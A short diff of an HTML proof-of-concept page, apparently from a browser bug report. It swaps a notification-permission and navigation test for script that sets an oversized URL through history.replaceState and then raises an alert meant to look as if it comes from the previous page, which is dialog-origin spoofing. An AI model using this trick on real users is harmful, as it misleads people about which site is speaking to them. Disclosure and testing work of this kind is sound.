@@ -1,13 +1,9 @@
 <script>
-function notifyMe(e) {
-        if(Notification.permission !== 'denied'){
-                Notification.requestPermission(function(){});
-        }
+a="aaaaaaaaaaaaaaaa";
+for (i = 0; i < 19; i++) { 
+a += a;
 }
-function w(){
-        notifyMe();
-        open('https://www.google.com', '_self');
-        onunload = function(){ notifyMe(); }
-}
+history.replaceState("example", "example", a);
+alert("This alert will be shown as 'From this page', while still rendering the page the link was clicked from");
 </script>
-<input type="button" onclick="w()" value="Test"/>
+The attack page goes here
